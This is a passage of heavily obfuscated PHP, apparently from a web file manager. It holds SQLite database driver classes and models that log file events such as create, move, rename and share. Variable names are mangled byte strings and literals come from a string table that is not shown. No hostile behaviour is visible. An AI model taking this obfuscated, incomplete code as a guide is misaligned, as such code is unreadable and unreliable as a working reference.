$Ô¬˝ã¥ÿ =& $_SERVER[Çâä∆◊¡]; $˘≈Ûãí” = $this->in[$Ô¬˝ã¥ÿ[9]]; $œÖùéÏ€ = str_replace($Ô¬˝ã¥ÿ[10], $Ô¬˝ã¥ÿ[11], trim(trim($œÖùéÏ€, $Ô¬˝ã¥ÿ[8]), $Ô¬˝ã¥ÿ[12])); if (!$œÖùéÏ€ || count($˘≈Ûãí”) <= $Ë”‹Ñ°å) { return !1; } $òØØèñÚ = !0; $Ù˝ƒ˚â» = explode($Ô¬˝ã¥ÿ[8], $œÖùéÏ€); for ($á∫ŸÆäü = 0; $á∫ŸÆäü < count($Ù˝ƒ˚â»); $á∫ŸÆäü++) { if ($Ù˝ƒ˚â»[$á∫ŸÆäü] != $˘≈Ûãí”[$Ë”‹Ñ°å + $á∫ŸÆäü]) { $òØØèñÚ = !1; break; } } if (!$òØØèñÚ) { return; } call_user_func_array(array($this, $·—˜˘ëç), array()); } public function routeArgs($˙Öƒª¡ù = 3) { $öËÆÆÏ  = $this->in[$_SERVER[Çâä∆◊¡][9]]; if (count($öËÆÆÏ ) <= $˙Öƒª¡ù) { return array(); } $û˝ﬂ¿ì = array(); for ($“äÄç÷Ã = $˙Öƒª¡ù; $“äÄç÷Ã < count($öËÆÆÏ ); $“äÄç÷Ã += 2) { $û˝ﬂ¿ì[$öËÆÆÏ [$“äÄç÷Ã]] = $öËÆÆÏ [$“äÄç÷Ã + 1]; $this->in[$öËÆÆÏ [$“äÄç÷Ã]] = $öËÆÆÏ [$“äÄç÷Ã + 1]; } return $û˝ﬂ¿ì; } protected function assign($´≥ß˜Êˆ, $∑ûÜı”ë) { $this->values[$´≥ß˜Êˆ] = $∑ûÜı”ë; } protected function display($Ïâ∑ËÉè) { ob_end_clean(); extract($this->values); require $this->tpl . $Ïâ∑ËÉè; } } class DbSqliteBase extends Db { public function __construct($®•”ÎÉ∆ = '') { $ï´€‘ﬂ¨ =& $_SERVER[Çâä∆◊¡]; if (!extension_loaded($ï´€‘ﬂ¨[13])) { think_exception(think_lang($ï´€‘ﬂ¨[14]) . $ï´€‘ﬂ¨[15]); } if (!empty($®•”ÎÉ∆)) { if (!isset($®•”ÎÉ∆[$ï´€‘ﬂ¨[16]])) { $®•”ÎÉ∆[$ï´€‘ﬂ¨[16]] = 438; } $this->config = $®•”ÎÉ∆; if (empty($this->config[$ï´€‘ﬂ¨[17]])) { $this->config[$ï´€‘ﬂ¨[17]] = array(); } } } public function connect($ˆ˙‹„≠Ñ = '', $“Ê…é·¶ = 0) { $Ã≈ÎöÖá =& $_SERVER[Çâä∆◊¡]; if (!isset($this->linkID[$“Ê…é·¶])) { if (empty($ˆ˙‹„≠Ñ)) { $ˆ˙‹„≠Ñ = $this->config; } $ãÈÏ√Â∂ = !empty($ˆ˙‹„≠Ñ[$Ã≈ÎöÖá[17]][$Ã≈ÎöÖá[18]]) ? $ˆ˙‹„≠Ñ[$Ã≈ÎöÖá[17]][$Ã≈ÎöÖá[18]] : $this->pconnect; $Ÿéã„ÿÜ = $ãÈÏ√Â∂ ? $Ã≈ÎöÖá[19] : $Ã≈ÎöÖá[20]; $this->linkID[$“Ê…é·¶] = $Ÿéã„ÿÜ($ˆ˙‹„≠Ñ[$Ã≈ÎöÖá[21]], $ˆ˙‹„≠Ñ[$Ã≈ÎöÖá[16]]); if (!$this->linkID[$“Ê…é·¶]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$“Ê…é·¶], 30000); if (1 != think_config($Ã≈ÎöÖá[22])) { unset($this->config); } } return $this->linkID[$“Ê…é·¶]; } public function free() { $this->queryID = null; } public function query($úë¡»öü) { $€¡⁄Ωﬂº =& $_SERVER[Çâä∆◊¡]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $úë¡»öü; if ($this->queryID) { $this->free(); } think_action_status($€¡⁄Ωﬂº[23], 1); think_status($€¡⁄Ωﬂº[24]); $this->queryID = sqlite_query($this->_linkID, $úë¡»öü); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $∑ä∑â±ÿ = $this->getAll(); return $∑ä∑â±ÿ; } } public function execute($ú¯Ö¥ßô) { $ÎÚ¢ÜˆÅ =& $_SERVER[Çâä∆◊¡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ú¯Ö¥ßô; if ($this->queryID) { $this->free(); } think_action_status($ÎÚ¢ÜˆÅ[25], 1); think_status($ÎÚ¢ÜˆÅ[24]); $ﬂôæã€  = sqlite_exec($this->_linkID, $ú¯Ö¥ßô); $this->debug(); if (!1 === $ﬂôæã€ ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Çâä∆◊¡][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‡ñœ°Í∏ = sqlite_query($this->_linkID, $_SERVER[Çâä∆◊¡][27]); if (!$‡ñœ°Í∏) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ú¬€áêø = sqlite_query($this->_linkID, $_SERVER[Çâä∆◊¡][28]); if (!$Ú¬€áêø) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¸Á¥Åïß = array(); if ($this->numRows > 0) { for ($ºπæ”Ä◊ = 0; $ºπæ”Ä◊ < $this->numRows; $ºπæ”Ä◊++) { $¸Á¥Åïß[$ºπæ”Ä◊] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¸Á¥Åïß; } public function getFields($…àﬁœë√) { $Ç∂‡«–« =& $_SERVER[Çâä∆◊¡]; $◊ﬁ¶Ó® = $this->query($Ç∂‡«–«[29] . $…àﬁœë√ . $Ç∂‡«–«[30]); $Œ—´ºØ∑ = array(); if ($◊ﬁ¶Ó®) { foreach ($◊ﬁ¶Ó® as $«˝€≈ö => $ŸÃ§ﬂÄò) { $Œ—´ºØ∑[$ŸÃ§ﬂÄò[$Ç∂‡«–«[31]]] = array($Ç∂‡«–«[32] => $ŸÃ§ﬂÄò[$Ç∂‡«–«[31]], $Ç∂‡«–«[33] => $ŸÃ§ﬂÄò[$Ç∂‡«–«[34]], $Ç∂‡«–«[35] => (bool) ($ŸÃ§ﬂÄò[$Ç∂‡«–«[36]] === $Ç∂‡«–«[12]), $Ç∂‡«–«[37] => $ŸÃ§ﬂÄò[$Ç∂‡«–«[38]], $Ç∂‡«–«[39] => strtolower($ŸÃ§ﬂÄò[$Ç∂‡«–«[40]]) == $Ç∂‡«–«[41], $Ç∂‡«–«[42] => strtolower($ŸÃ§ﬂÄò[$Ç∂‡«–«[43]]) == $Ç∂‡«–«[44]); } } return $Œ—´ºØ∑; } public function getTables($⁄⁄»Â≤Ú = '') { $˘£†Â¿º =& $_SERVER[Çâä∆◊¡]; $ á„µ⁄Ÿ = $this->query($˘£†Â¿º[45] . $˘£†Â¿º[46] . $˘£†Â¿º[47]); $’©≥ë‹¿ = array(); foreach ($ á„µ⁄Ÿ as $’àè¿ø• => $°ËÀá“Â) { $’©≥ë‹¿[$’àè¿ø•] = current($°ËÀá“Â); } return $’©≥ë‹¿; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $∑“øè¥ï =& $_SERVER[Çâä∆◊¡]; $¬ı”ù∏Î = sqlite_last_error($this->_linkID); $this->error = $¬ı”ù∏Î . $∑“øè¥ï[4] . sqlite_error_string($¬ı”ù∏Î); if ($∑“øè¥ï[12] != $this->queryStr) { $this->error .= LNG($∑“øè¥ï[48]) . $this->queryStr; } think_trace($this->error, $∑“øè¥ï[12], $∑“øè¥ï[49]); return $this->error; } public function escapeString($ÈÌÔ‚÷“) { return sqlite_escape_string($ÈÌÔ‚÷“); } public function parseLimit($¸°ºÓÆ‡) { $ñàÿﬁ∞Ú =& $_SERVER[Çâä∆◊¡]; $÷ôÂÒ¯Ä = $ñàÿﬁ∞Ú[12]; if (!empty($¸°ºÓÆ‡)) { $¸°ºÓÆ‡ = explode($ñàÿﬁ∞Ú[50], $¸°ºÓÆ‡); if (count($¸°ºÓÆ‡) > 1) { $÷ôÂÒ¯Ä .= $ñàÿﬁ∞Ú[51] . $¸°ºÓÆ‡[1] . $ñàÿﬁ∞Ú[52] . $¸°ºÓÆ‡[0] . $ñàÿﬁ∞Ú[53]; } else { $÷ôÂÒ¯Ä .= $ñàÿﬁ∞Ú[51] . $¸°ºÓÆ‡[0] . $ñàÿﬁ∞Ú[53]; } } return $÷ôÂÒ¯Ä; } } class DbSqlite3Base extends Db { public function __construct($é´È±º  = '') { $ÇìÔÈ‡£ =& $_SERVER[Çâä∆◊¡]; if (!class_exists($ÇìÔÈ‡£[54])) { think_exception(think_lang($ÇìÔÈ‡£[14]) . $ÇìÔÈ‡£[55]); } if (!empty($é´È±º )) { if (!isset($é´È±º [$ÇìÔÈ‡£[16]])) { $é´È±º [$ÇìÔÈ‡£[16]] = 438; } $this->config = $é´È±º ; if (empty($this->config[$ÇìÔÈ‡£[17]])) { $this->config[$ÇìÔÈ‡£[17]] = array(); } } } public function connect($õó—˜Ê≠ = '', $—˜ Å°ä = 0) { $–ª‹«‹› =& $_SERVER[Çâä∆◊¡]; if (!isset($this->linkID[$—˜ Å°ä])) { if (empty($õó—˜Ê≠)) { $õó—˜Ê≠ = $this->config; } $this->linkID[$—˜ Å°ä] = new SQLite3($õó—˜Ê≠[$–ª‹«‹›[21]]); if (!$this->linkID[$—˜ Å°ä]) { think_exception($this->linkID[$—˜ Å°ä]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$—˜ Å°ä]->busyTimeout(30000); if (1 != think_config($–ª‹«‹›[22])) { unset($this->config); } } return $this->linkID[$—˜ Å°ä]; } public function free() { $this->queryID = null; } public function query($Ü—¬¶´ì) { $ÆòÌñã› =& $_SERVER[Çâä∆◊¡]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ü—¬¶´ì; if ($this->queryID) { $this->free(); } think_action_status($ÆòÌñã›[23], 1); think_status($ÆòÌñã›[24]); $this->queryID = $this->_linkID->query($Ü—¬¶´ì); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $«ˆõâﬂü = $this->getAll(); $this->numRows = count($«ˆõâﬂü); return $«ˆõâﬂü; } } public function execute($à”Ô–Ò‘) { $Öå‰∞†ﬂ =& $_SERVER[Çâä∆◊¡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $à”Ô–Ò‘; if ($this->queryID) { $this->free(); } think_action_status($Öå‰∞†ﬂ[25], 1); think_status($Öå‰∞†ﬂ[24]); $¶‡Å˜é· = $this->_linkID->exec($à”Ô–Ò‘); $this->debug(); if (!1 === $¶‡Å˜é·) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Çâä∆◊¡][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¯≈¿¡ì˝ = $this->_linkID->query($_SERVER[Çâä∆◊¡][27]); if (!$¯≈¿¡ì˝) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ƒ√Ÿ·“ç = $this->_linkID->query($_SERVER[Çâä∆◊¡][28]); if (!$ƒ√Ÿ·“ç) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $∏ÒÛÌﬂ˚ = array(); while ($ü˙⁄©°Ä = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $∏ÒÛÌﬂ˚[] = $ü˙⁄©°Ä; } $this->queryID->reset(); return $∏ÒÛÌﬂ˚; } public function getFields($îøÔ·⁄˛) { $√Ò‚È⁄Ù =& $_SERVER[Çâä∆◊¡]; $øŸ©ŸŸŒ = $this->query($√Ò‚È⁄Ù[29] . $îøÔ·⁄˛ . $√Ò‚È⁄Ù[30]); $ñÈù»ÉŒ = array(); if ($øŸ©ŸŸŒ) { foreach ($øŸ©ŸŸŒ as $ ≈ÊƒÓ† => $ñ‡”Ì‘õ) { $ñÈù»ÉŒ[$ñ‡”Ì‘õ[$√Ò‚È⁄Ù[32]]] = array($√Ò‚È⁄Ù[32] => $ñ‡”Ì‘õ[$√Ò‚È⁄Ù[32]], $√Ò‚È⁄Ù[33] => $ñ‡”Ì‘õ[$√Ò‚È⁄Ù[33]], $√Ò‚È⁄Ù[35] => (bool) ($ñ‡”Ì‘õ[$√Ò‚È⁄Ù[35]] === $√Ò‚È⁄Ù[12]), $√Ò‚È⁄Ù[37] => $ñ‡”Ì‘õ[$√Ò‚È⁄Ù[56]], $√Ò‚È⁄Ù[39] => (bool) $ñ‡”Ì‘õ[$√Ò‚È⁄Ù[57]], $√Ò‚È⁄Ù[42] => (bool) $ñ‡”Ì‘õ[$√Ò‚È⁄Ù[57]]); } } return $ñÈù»ÉŒ; } public function getTables($—˛ôŸÉù = '') { $√˛óœ’· =& $_SERVER[Çâä∆◊¡]; $á«¨°ò∑ = $this->query($√˛óœ’·[45] . $√˛óœ’·[46] . $√˛óœ’·[47]); $ÇÿØ¸é› = array(); foreach ($á«¨°ò∑ as $Ï“±·⁄¥ => $·ﬁ∆„±˛) { $ÇÿØ¸é›[$Ï“±·⁄¥] = current($·ﬁ∆„±˛); } return $ÇÿØ¸é›; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ÎÕåﬁÏƒ =& $_SERVER[Çâä∆◊¡]; $this->error = $this->_linkID->lastErrorMsg(); if ($ÎÕåﬁÏƒ[12] != $this->queryStr) { $this->error .= LNG($ÎÕåﬁÏƒ[48]) . $this->queryStr; } think_trace($this->error, $ÎÕåﬁÏƒ[12], $ÎÕåﬁÏƒ[49]); return $this->error; } public function escapeString($ç¿∞ﬁÏ™) { $»Ú˙«Ã˛ =& $_SERVER[Çâä∆◊¡]; if ($this->_linkID) { return $this->_linkID->escapeString($ç¿∞ﬁÏ™); } return str_ireplace($»Ú˙«Ã˛[58], $»Ú˙«Ã˛[59], $ç¿∞ﬁÏ™); } public function parseLimit($⁄Õ‚Õ≥∑) { $¡Ä˜êù„ =& $_SERVER[Çâä∆◊¡]; $ÀáãÑ«Æ = $¡Ä˜êù„[12]; if (!empty($⁄Õ‚Õ≥∑)) { $⁄Õ‚Õ≥∑ = explode($¡Ä˜êù„[50], $⁄Õ‚Õ≥∑); if (count($⁄Õ‚Õ≥∑) > 1) { $ÀáãÑ«Æ .= $¡Ä˜êù„[51] . $⁄Õ‚Õ≥∑[1] . $¡Ä˜êù„[52] . $⁄Õ‚Õ≥∑[0] . $¡Ä˜êù„[53]; } else { $ÀáãÑ«Æ .= $¡Ä˜êù„[51] . $⁄Õ‚Õ≥∑[0] . $¡Ä˜êù„[53]; } } return $ÀáãÑ«Æ; } } goto DŸâÑ ıÈ¿; fòõ»Õ¯ÊÖ: class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\x72\x63\x65\137\x65\166\145\x6e\x74"; protected $dataAuto = array(array("\x63\162\x65\x61\164\145\x54\151\155\x65", "\164\x69\155\x65", "\x69\x6e\x73\145\162\164", "\x66\165\156\x63\164\x69\x6f\156"), array("\144\145\163\143", '', "\151\x6e\163\x65\x72\164\x2c\x75\x70\x64\x61\164\x65\54\x73\x65\x6c\x65\143\x74", "\x6a\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($πœ”Â»÷, $ô€Äó¯¢, $œ‚Ω¡é’ = '') { $‡µ‰π¥Ÿ =& $_SERVER[Çâä∆◊¡]; if (!$this->eventSave) { return; } $÷õä®ãò = Model($‡µ‰π¥Ÿ[1312])->sourceInfo($πœ”Â»÷); if (!$÷õä®ãò) { return !1; } if ($this->isCacheEvent($÷õä®ãò, $ô€Äó¯¢)) { return; } if ($œ‚Ω¡é’ && is_string($œ‚Ω¡é’)) { $œ‚Ω¡é’ = array($‡µ‰π¥Ÿ[1848] => $œ‚Ω¡é’); } $∑”Ä‹‘µ = array($‡µ‰π¥Ÿ[418] => $πœ”Â»÷, $‡µ‰π¥Ÿ[2022] => $÷õä®ãò[$‡µ‰π¥Ÿ[498]], $‡µ‰π¥Ÿ[2023] => $÷õä®ãò[$‡µ‰π¥Ÿ[32]], $‡µ‰π¥Ÿ[519] => !empty($÷õä®ãò[$‡µ‰π¥Ÿ[519]]) ? $÷õä®ãò[$‡µ‰π¥Ÿ[519]] : $‡µ‰π¥Ÿ[12], $‡µ‰π¥Ÿ[1633] => USER_ID, $‡µ‰π¥Ÿ[423] => $ô€Äó¯¢, $‡µ‰π¥Ÿ[1635] => $œ‚Ω¡é’); $this->addSystemLog($ô€Äó¯¢, $∑”Ä‹‘µ); unset($∑”Ä‹‘µ[$‡µ‰π¥Ÿ[2023]], $∑”Ä‹‘µ[$‡µ‰π¥Ÿ[519]]); return $this->add($∑”Ä‹‘µ); } private function addSystemLog($§◊≠Àƒâ, $∂ı£ πå) { $ÌÙé‘⁄ì =& $_SERVER[Çâä∆◊¡]; if ($§◊≠Àƒâ == $ÌÙé‘⁄ì[2024]) { $§◊≠Àƒâ = $∂ı£ πå[$ÌÙé‘⁄ì[451]][$ÌÙé‘⁄ì[2025]]; } else { if (in_array($§◊≠Àƒâ, array($ÌÙé‘⁄ì[1790], $ÌÙé‘⁄ì[2026]))) { $§◊≠Àƒâ = $∂ı£ πå[$ÌÙé‘⁄ì[451]][$ÌÙé‘⁄ì[748]]; } } $£´¸áÆÖ = array_merge($∂ı£ πå, array($ÌÙé‘⁄ì[2027] => $∂ı£ πå[$ÌÙé‘⁄ì[403]], $ÌÙé‘⁄ì[2028] => $∂ı£ πå[$ÌÙé‘⁄ì[2028]])); Hook::trigger($ÌÙé‘⁄ì[2029], $ÌÙé‘⁄ì[2030] . $§◊≠Àƒâ, $∂ı£ πå); Model($ÌÙé‘⁄ì[1754])->addLog($ÌÙé‘⁄ì[2030] . $§◊≠Àƒâ, $£´¸áÆÖ); } private function isCacheEvent($ö†•◊¸˙, $Ÿ±÷ƒèë) { if ($ö†•◊¸˙[$_SERVER[Çâä∆◊¡][412]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($ìÈµ„àﬁ, $ß§∫ã√∞) { $º“√ìä˝ =& $_SERVER[Çâä∆◊¡]; $Ûç…ßûÑ = Model($º“√ìä˝[1312])->sourceInfo($ìÈµ„àﬁ); $ù¡›ﬁ•• = array($º“√ìä˝[2025] => $ß§∫ã√∞, $º“√ìä˝[32] => $Ûç…ßûÑ[$º“√ìä˝[32]]); return $this->addEvent($ìÈµ„àﬁ, $º“√ìä˝[2024], $ù¡›ﬁ••); } public function eventFileEdit($î˛–›ï¶) { $©õ∆öü◊ =& $_SERVER[Çâä∆◊¡]; $éäì∫¢¶ = array($©õ∆öü◊[2031] => $_SERVER[$©õ∆öü◊[2032]], $©õ∆öü◊[2033] => strtolower(ACTION)); return $this->addEvent($î˛–›ï¶, $©õ∆öü◊[1780], $éäì∫¢¶); } public function eventRecycle($ÏÈç—…ø, $ÒΩÀÊ‚É) { return $this->addEvent($ÏÈç—…ø, $_SERVER[Çâä∆◊¡][2026], $ÒΩÀÊ‚É); } public function eventRemove($©ïÏõ·˘) { $˚ß‘ì∑© =& $_SERVER[Çâä∆◊¡]; $ö¥æøº⁄ = Model($˚ß‘ì∑©[1312])->sourceInfo($©ïÏõ·˘); $óÈ⁄û“ˆ = $ö¥æøº⁄[$˚ß‘ì∑©[32]]; return $this->addEvent($ö¥æøº⁄[$˚ß‘ì∑©[498]], $˚ß‘ì∑©[1779], $óÈ⁄û“ˆ); } public function eventShare($≥»Ì¥≈í, $†–£π≤ƒ) { return $this->addEvent($≥»Ì¥≈í, $_SERVER[Çâä∆◊¡][1790], $†–£π≤ƒ); } public function eventMove($ÎßÀ‘Âò, $©«–ıàË, $è‰üﬂ«Ú) { $Ü–∆¬Úò =& $_SERVER[Çâä∆◊¡]; $…®®íõ = Model($Ü–∆¬Úò[1312]); $Ö……Ö≠§ = $…®®íõ->sourceInfo($ÎßÀ‘Âò); $óÓﬁ˙•’ = $…®®íõ->sourceInfo($©«–ıàË); $úî»èõµ = $…®®íõ->sourceInfo($è‰üﬂ«Ú); $ÕçÜÑÂ‰ = array($Ü–∆¬Úò[1145] => $©«–ıàË, $Ü–∆¬Úò[2034] => $óÓﬁ˙•’[$Ü–∆¬Úò[32]], $Ü–∆¬Úò[2013] => !empty($óÓﬁ˙•’[$Ü–∆¬Úò[519]]) ? $óÓﬁ˙•’[$Ü–∆¬Úò[519]] : $Ü–∆¬Úò[12], $Ü–∆¬Úò[1146] => $è‰üﬂ«Ú, $Ü–∆¬Úò[2035] => $úî»èõµ[$Ü–∆¬Úò[32]], $Ü–∆¬Úò[2036] => !empty($úî»èõµ[$Ü–∆¬Úò[519]]) ? $úî»èõµ[$Ü–∆¬Úò[519]] : $Ü–∆¬Úò[12]); $this->addEvent($ÎßÀ‘Âò, $Ü–∆¬Úò[551], $ÕçÜÑÂ‰); $Ö……Ö≠§ = $…®®íõ->sourceInfo($ÎßÀ‘Âò); $ÕçÜÑÂ‰ = array($Ü–∆¬Úò[403] => $Ö……Ö≠§[$Ü–∆¬Úò[403]], $Ü–∆¬Úò[32] => $Ö……Ö≠§[$Ü–∆¬Úò[32]]); $this->addEvent($©«–ıàË, $Ü–∆¬Úò[2037], $ÕçÜÑÂ‰); } public function eventCopy($≈ÆÌÌÜÍ) { $this->eventCreate($≈ÆÌÌÜÍ, $_SERVER[Çâä∆◊¡][549]); } public function eventRename($Òì•ÔŒ¬, $è§ïÂã…, $˛Û≠ÅÒÔ) { $’¸í°—¿ =& $_SERVER[Çâä∆◊¡]; $ÒüÈàËô = array($’¸í°—¿[1145] => $è§ïÂã…, $’¸í°—¿[1146] => $˛Û≠ÅÒÔ); return $this->addEvent($Òì•ÔŒ¬, $’¸í°—¿[1327], $ÒüÈàËô); } public function eventAddComment($“¨¨ãã†, $üùÂòÒ´) { return $this->addEvent($“¨¨ãã†, $_SERVER[Çâä∆◊¡][2038], $üùÂòÒ´); } public function eventAddDesc($ò˜±˙¸ù, $¶ñπàÁ) { return $this->addEvent($ò˜±˙¸ù, $_SERVER[Çâä∆◊¡][2039], $¶ñπàÁ); } public function listBySource($ı›È‚À√) { $’âªÃ„Ë =& $_SERVER[Çâä∆◊¡]; $ì£ôì¿÷ = Model($’âªÃ„Ë[1312])->sourceInfo($ı›È‚À√); $‹å˛‹öƒ = array($’âªÃ„Ë[418] => $ı›È‚À√); if ($ì£ôì¿÷[$’âªÃ„Ë[411]] == $’âªÃ„Ë[89]) { $ı°’å = Model($’âªÃ„Ë[1312])->listSearchChildren($ı›È‚À√, 20000); $ı°’å[] = $ı›È‚À√ . $’âªÃ„Ë[373]; $‹å˛‹öƒ = array($’âªÃ„Ë[403] => array($’âªÃ„Ë[7], $ı°’å)); } $„¡‡˝êª = $this->where($‹å˛‹öƒ)->order($’âªÃ„Ë[2040])->selectPage(); if ($„¡‡˝êª[$’âªÃ„Ë[361]][$’âªÃ„Ë[362]] == 0) { $„¡‡˝êª[$’âªÃ„Ë[361]][$’âªÃ„Ë[362]] = 1; $„¡‡˝êª[$’âªÃ„Ë[364]] = array(array($’âªÃ„Ë[418] => $ı›È‚À√, $’âªÃ„Ë[2022] => $ì£ôì¿÷[$’âªÃ„Ë[498]], $’âªÃ„Ë[1633] => $ì£ôì¿÷[$’âªÃ„Ë[452]], $’âªÃ„Ë[423] => $’âªÃ„Ë[2041], $’âªÃ„Ë[424] => $ì£ôì¿÷[$’âªÃ„Ë[193]], $’âªÃ„Ë[1635] => $’âªÃ„Ë[12])); } return $this->eventListParse($„¡‡˝êª, $ı›È‚À√); } private function eventListParse($‡ƒÔÃÄ, $õ∫›†ÔÒ) { $ÉÂÿ◊ñà =& $_SERVER[Çâä∆◊¡]; $Áù˚´ò≤ = $‡ƒÔÃÄ[$ÉÂÿ◊ñà[364]]; $ÏçÈ≥™Ï = array_to_keyvalue($Áù˚´ò≤, $ÉÂÿ◊ñà[12], $ÉÂÿ◊ñà[403]); $î”¨ÄÄ¿ = array_to_keyvalue($Áù˚´ò≤, $ÉÂÿ◊ñà[12], $ÉÂÿ◊ñà[2028]); foreach ($Áù˚´ò≤ as $ÒÆ£ûŒ) { $§ŒË‘§“ = $ÒÆ£ûŒ[$ÉÂÿ◊ñà[451]]; if ($ÒÆ£ûŒ[$ÉÂÿ◊ñà[33]] == $ÉÂÿ◊ñà[551] && isset($§ŒË‘§“[$ÉÂÿ◊ñà[1145]])) { $ÏçÈ≥™Ï[] = $§ŒË‘§“[$ÉÂÿ◊ñà[1145]] . $ÉÂÿ◊ñà[12]; $ÏçÈ≥™Ï[] = $§ŒË‘§“[$ÉÂÿ◊ñà[1146]] . $ÉÂÿ◊ñà[12]; } if ($ÒÆ£ûŒ[$ÉÂÿ◊ñà[33]] == $ÉÂÿ◊ñà[2037] && isset($§ŒË‘§“[$ÉÂÿ◊ñà[403]])) { $ÏçÈ≥™Ï[] = $§ŒË‘§“[$ÉÂÿ◊ñà[403]] . $ÉÂÿ◊ñà[12]; } } $ÏçÈ≥™Ï = array_merge($ÏçÈ≥™Ï, $î”¨ÄÄ¿, array($õ∫›†ÔÒ . $ÉÂÿ◊ñà[12])); $ÏçÈ≥™Ï = array_unique($ÏçÈ≥™Ï); $Ô≤ãÒ—˚ = array_unique(array_to_keyvalue($Áù˚´ò≤, $ÉÂÿ◊ñà[12], $ÉÂÿ◊ñà[1642])); $ß˜Á∑¢ÿ = Model($ÉÂÿ◊ñà[538])->userListInfo($Ô≤ãÒ—˚); $»®∂ıôú = Model($ÉÂÿ◊ñà[818])->sourceListInfo($ÏçÈ≥™Ï, !0); foreach ($Áù˚´ò≤ as &$ÒÆ£ûŒ) { if ($ÒÆ£ûŒ[$ÉÂÿ◊ñà[33]] == $ÉÂÿ◊ñà[551] && isset($ÒÆ£ûŒ[$ÉÂÿ◊ñà[451]][$ÉÂÿ◊ñà[1145]])) { $ÒÆ£ûŒ[$ÉÂÿ◊ñà[451]][$ÉÂÿ◊ñà[1145]] = $»®∂ıôú[$ÒÆ£ûŒ[$ÉÂÿ◊ñà[451]][$ÉÂÿ◊ñà[1145]]]; $ÒÆ£ûŒ[$ÉÂÿ◊ñà[451]][$ÉÂÿ◊ñà[1146]] = $»®∂ıôú[$ÒÆ£ûŒ[$ÉÂÿ◊ñà[451]][$ÉÂÿ◊ñà[1146]]]; } if ($ÒÆ£ûŒ[$ÉÂÿ◊ñà[33]] == $ÉÂÿ◊ñà[2037] && isset($ÒÆ£ûŒ[$ÉÂÿ◊ñà[451]][$ÉÂÿ◊ñà[403]])) { $ÒÆ£ûŒ[$ÉÂÿ◊ñà[451]][$ÉÂÿ◊ñà[403]] = $»®∂ıôú[$ÒÆ£ûŒ[$ÉÂÿ◊ñà[451]][$ÉÂÿ◊ñà[403]]]; } $ÒÆ£ûŒ[$ÉÂÿ◊ñà[87]] = $»®∂ıôú[$ÒÆ£ûŒ[$ÉÂÿ◊ñà[403]]]; $ÒÆ£ûŒ[$ÉÂÿ◊ñà[2042]] = $»®∂ıôú[$ÒÆ£ûŒ[$ÉÂÿ◊ñà[2028]]]; if ($ÒÆ£ûŒ[$ÉÂÿ◊ñà[33]] == $ÉÂÿ◊ñà[1779]) { $ÒÆ£ûŒ[$ÉÂÿ◊ñà[2042]] = $ÒÆ£ûŒ[$ÉÂÿ◊ñà[87]]; $ÒÆ£ûŒ[$ÉÂÿ◊ñà[2028]] = $ÒÆ£ûŒ[$ÉÂÿ◊ñà[2042]][$ÉÂÿ◊ñà[403]]; $ÒÆ£ûŒ[$ÉÂÿ◊ñà[87]] = !1; $ÒÆ£ûŒ[$ÉÂÿ◊ñà[403]] = $ÉÂÿ◊ñà[12]; } $ÒÆ£ûŒ[$ÉÂÿ◊ñà[1973]] = $ß˜Á∑¢ÿ[$ÒÆ£ûŒ[$ÉÂÿ◊ñà[1642]]]; } unset($ÒÆ£ûŒ); $‡ƒÔÃÄ[$ÉÂÿ◊ñà[364]] = $Áù˚´ò≤; return $‡ƒÔÃÄ; } public function removeBySource($ïƒ¯ﬂƒÏ) { $ùÿÙ∫¨ = array($_SERVER[Çâä∆◊¡][418] => $ïƒ¯ﬂƒÏ); $this->where($ùÿÙ∫¨)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\x72\143\145\x5f\x68\x69\163\164\x6f\162\x79"; public function historyCount($“ÙÓÖßæ) { $˛Ê™õÓ˛ =& $_SERVER[Çâä∆◊¡]; if (!$“ÙÓÖßæ) { return array(); } if (is_string($“ÙÓÖßæ) || is_int($“ÙÓÖßæ)) { $“ÙÓÖßæ = array($“ÙÓÖßæ); } $€ÄÈ·∂Œ = array($˛Ê™õÓ˛[403], $˛Ê™õÓ˛[1842] => $˛Ê™õÓ˛[500]); $„æèµÕ∫ = array($˛Ê™õÓ˛[403] => array($˛Ê™õÓ˛[7], $“ÙÓÖßæ)); $‘ÃÖÿŒ° = $this->field($€ÄÈ·∂Œ)->where($„æèµÕ∫)->group($˛Ê™õÓ˛[403])->select(); return array_to_keyvalue($‘ÃÖÿŒ°, 